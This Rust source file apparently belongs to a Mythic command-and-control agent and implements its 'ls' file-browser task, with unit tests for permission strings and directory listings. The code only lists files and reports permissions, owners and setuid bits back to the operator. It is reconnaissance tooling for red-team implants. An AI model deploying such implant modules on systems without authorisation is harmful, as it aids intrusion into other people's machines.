use crate::structs::{
    FileBrowser, FileBrowserArguments, FileData, FilePermission, Task,
};
use std::os::unix::fs::{MetadataExt, PermissionsExt};
use std::path::Path;

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: FileBrowserArguments = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => FileBrowserArguments {
            path: Some(task.data.params.clone()),
            file: None,
            host: None,
            file_browser: Some(false),
            depth: Some(1),
        },
    };

    let target_path = args
        .path
        .as_deref()
        .unwrap_or(".");
    let full_path = if let Some(file) = &args.file {
        if target_path.ends_with('/') {
            format!("{}{}", target_path, file)
        } else {
            format!("{}/{}", target_path, file)
        }
    } else {
        target_path.to_string()
    };

    let path = Path::new(&full_path);
    let abspath = std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    let metadata = match std::fs::metadata(&abspath) {
        Ok(m) => m,
        Err(e) => {
            response.set_error(&format!("Failed to stat path: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let is_file = !metadata.is_dir();
    let mut perm = build_permission(&metadata);
    // Check if the original path is a symlink
    let symlink_target = std::fs::read_link(path)
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();
    if !symlink_target.is_empty() {
        perm.symlink = symlink_target;
    }

    let name = abspath
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| full_path.clone());
    let parent = abspath
        .parent()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();

    let mut files = Vec::new();
    let mut success = true;

    if metadata.is_dir() {
        match std::fs::read_dir(&abspath) {
            Ok(entries) => {
                for entry in entries.flatten() {
                    let entry_path = entry.path();
                    if let Ok(meta) = entry.metadata() {
                        let mut entry_perm = build_permission(&meta);
                        // Check for symlinks
                        let entry_symlink = std::fs::read_link(&entry_path)
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default();
                        if !entry_symlink.is_empty() {
                            entry_perm.symlink = entry_symlink;
                        }
                        files.push(FileData {
                            is_file: meta.is_file(),
                            permissions: entry_perm,
                            name: entry.file_name().to_string_lossy().to_string(),
                            full_name: entry_path.to_string_lossy().to_string(),
                            file_size: meta.len() as i64,
                            last_modified: meta
                                .modified()
                                .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() as i64)
                                .unwrap_or(0),
                            last_access: meta
                                .accessed()
                                .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() as i64)
                                .unwrap_or(0),
                        });
                    }
                }
            }
            Err(_) => {
                success = false;
            }
        }
    }

    // Always send file_browser data (matches Poseidon behavior).
    // set_as_user_output tells Mythic to copy the JSON into user_output
    // so the browser script can parse and render it.
    response.file_browser = Some(FileBrowser {
        files,
        is_file,
        permissions: perm,
        filename: name,
        parent_path: parent,
        success,
        file_size: metadata.len() as i64,
        last_modified: metadata
            .modified()
            .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() as i64)
            .unwrap_or(0),
        last_access: metadata
            .accessed()
            .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() as i64)
            .unwrap_or(0),
        update_deleted: true,
        set_as_user_output: true,
    });
    response.completed = true;

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}

pub(crate) fn build_permission(meta: &std::fs::Metadata) -> FilePermission {
    let mode = meta.permissions().mode();
    let perm_string = format!(
        "{}{}{}{}{}{}{}{}{}",
        if mode & 0o400 != 0 { "r" } else { "-" },
        if mode & 0o200 != 0 { "w" } else { "-" },
        if mode & 0o100 != 0 { "x" } else { "-" },
        if mode & 0o040 != 0 { "r" } else { "-" },
        if mode & 0o020 != 0 { "w" } else { "-" },
        if mode & 0o010 != 0 { "x" } else { "-" },
        if mode & 0o004 != 0 { "r" } else { "-" },
        if mode & 0o002 != 0 { "w" } else { "-" },
        if mode & 0o001 != 0 { "x" } else { "-" },
    );

    let uid = meta.uid() as i32;
    let gid = meta.gid() as i32;
    let user = nix::unistd::User::from_uid(nix::unistd::Uid::from_raw(uid as u32))
        .ok()
        .flatten()
        .map(|u| u.name)
        .unwrap_or_else(|| uid.to_string());
    let group = nix::unistd::Group::from_gid(nix::unistd::Gid::from_raw(gid as u32))
        .ok()
        .flatten()
        .map(|g| g.name)
        .unwrap_or_else(|| gid.to_string());

    FilePermission {
        uid,
        gid,
        permissions: perm_string,
        setuid: mode & 0o4000 != 0,
        setgid: mode & 0o2000 != 0,
        sticky: mode & 0o1000 != 0,
        user,
        group,
        symlink: String::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_utils::make_test_task;
    use std::os::unix::fs::PermissionsExt;

    // -------------------------------------------------------------------------
    // build_permission — permission string encoding
    // -------------------------------------------------------------------------

    fn chmod_and_meta(path: &std::path::Path, mode: u32) -> std::fs::Metadata {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap();
        std::fs::metadata(path).unwrap()
    }

    #[test]
    fn test_permission_string_644() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("f.txt");
        std::fs::write(&f, b"").unwrap();
        let meta = chmod_and_meta(&f, 0o644);
        let perm = build_permission(&meta);
        assert_eq!(perm.permissions, "rw-r--r--");
        assert!(!perm.setuid);
        assert!(!perm.setgid);
        assert!(!perm.sticky);
    }

    #[test]
    fn test_permission_string_755() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("exe");
        std::fs::write(&f, b"").unwrap();
        let meta = chmod_and_meta(&f, 0o755);
        let perm = build_permission(&meta);
        assert_eq!(perm.permissions, "rwxr-xr-x");
    }

    #[test]
    fn test_permission_string_000() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("locked");
        std::fs::write(&f, b"").unwrap();
        let meta = chmod_and_meta(&f, 0o000);
        let perm = build_permission(&meta);
        assert_eq!(perm.permissions, "---------");
    }

    #[test]
    fn test_permission_string_777() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("open");
        std::fs::write(&f, b"").unwrap();
        let meta = chmod_and_meta(&f, 0o777);
        let perm = build_permission(&meta);
        assert_eq!(perm.permissions, "rwxrwxrwx");
    }

    #[test]
    fn test_setuid_bit_detected() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("suid");
        std::fs::write(&f, b"").unwrap();
        let meta = chmod_and_meta(&f, 0o4755);
        let perm = build_permission(&meta);
        assert!(perm.setuid);
    }

    #[test]
    fn test_sticky_bit_detected() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().join("sticky_dir");
        std::fs::create_dir(&d).unwrap();
        let meta = chmod_and_meta(&d, 0o1777);
        let perm = build_permission(&meta);
        assert!(perm.sticky);
    }

    // -------------------------------------------------------------------------
    // execute — directory listing via full command path
    // -------------------------------------------------------------------------

    #[tokio::test]
    async fn test_ls_lists_directory_contents() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("alpha.txt"), b"a").unwrap();
        std::fs::write(dir.path().join("beta.txt"), b"b").unwrap();

        let params = serde_json::json!({"path": dir.path().to_string_lossy()}).to_string();
        let (task, mut resp_rx, _) = make_test_task("ls1", &params);
        execute(task).await;

        let resp = resp_rx.recv().await.unwrap();
        assert!(resp.completed);
        let fb = resp.file_browser.expect("file_browser must be populated for ls");
        assert!(!fb.is_file, "directory path must report is_file=false");
        let names: Vec<_> = fb.files.iter().map(|f| f.name.as_str()).collect();
        assert!(names.contains(&"alpha.txt"), "alpha.txt missing from listing");
        assert!(names.contains(&"beta.txt"), "beta.txt missing from listing");
    }

    #[tokio::test]
    async fn test_ls_file_sets_is_file_true() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("single.txt");
        std::fs::write(&f, b"content").unwrap();

        let params = serde_json::json!({"path": f.to_string_lossy()}).to_string();
        let (task, mut resp_rx, _) = make_test_task("ls2", &params);
        execute(task).await;

        let resp = resp_rx.recv().await.unwrap();
        assert!(resp.completed);
        let fb = resp.file_browser.expect("file_browser required");
        assert!(fb.is_file);
        assert_eq!(fb.file_size, 7);
    }

    #[tokio::test]
    async fn test_ls_nonexistent_path_returns_error() {
        let params = serde_json::json!({"path": "/no/such/directory_xyz"}).to_string();
        let (task, mut resp_rx, _) = make_test_task("ls3", &params);
        execute(task).await;

        let resp = resp_rx.recv().await.unwrap();
        assert_eq!(resp.status, "error");
    }

    #[tokio::test]
    async fn test_ls_empty_directory() {
        let dir = tempfile::tempdir().unwrap();
        let params = serde_json::json!({"path": dir.path().to_string_lossy()}).to_string();
        let (task, mut resp_rx, _) = make_test_task("ls4", &params);
        execute(task).await;

        let resp = resp_rx.recv().await.unwrap();
        assert!(resp.completed);
        let fb = resp.file_browser.expect("file_browser required");
        assert!(fb.files.is_empty());
    }

    #[tokio::test]
    async fn test_ls_remove_task_always_sent() {
        let dir = tempfile::tempdir().unwrap();
        let params = serde_json::json!({"path": dir.path().to_string_lossy()}).to_string();
        let (task, _, mut remove_rx) = make_test_task("ls5", &params);
        execute(task).await;
        let id = remove_rx.recv().await.unwrap();
        assert_eq!(id, "ls5");
    }
}
